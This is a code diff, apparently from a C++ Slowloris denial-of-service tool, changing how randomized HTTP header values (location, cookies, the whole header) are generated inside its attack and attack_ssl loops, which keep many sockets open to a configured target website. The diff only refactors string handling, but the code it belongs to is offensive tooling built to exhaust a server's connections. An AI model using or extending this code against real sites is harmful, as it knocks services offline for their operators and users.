@@ -26,7 +26,7 @@ void Slowloris::attack(const int *id) {
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 init_header(&header);
             }else{
-                header.overide(const_cast<std::string &>(Randomizer::randomstr()));
+                Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
@@ -74,7 +74,7 @@ void Slowloris::attack_ssl(const int *id) {
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                 init_header(&header);
             }else{
-                header.overide(const_cast<std::string &>(Randomizer::randomstr()));
+                Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
@@ -108,7 +108,7 @@ void Slowloris::init_header(httphdr *header) {
         default:break;
     }
     if(conf->RandomizeHeader){
-        header->location = Randomizer::randomstr();
+         Randomizer::randomstr(header->location);
     }
     header->useragent = Randomizer::random_useragent(*(conf->useragents));
     header->cache_control = Randomizer::random_caching();
@@ -118,7 +118,8 @@ void Slowloris::init_header(httphdr *header) {
     header->accept = "*/*";
     header->connection_type = "Keep-Alive";
     header->content_type = Randomizer::random_contenttype();
-    header->cookie = {Randomizer::randomstr(), Randomizer::randomstr()};
+    Randomizer::randomstr(header->cookie[0]);
+    Randomizer::randomstr(header->cookie[1]);
     header->keep_alive = Randomizer::randomInt(1, 5000);
     header->DNT = Randomizer::randomInt(0, 1);
 
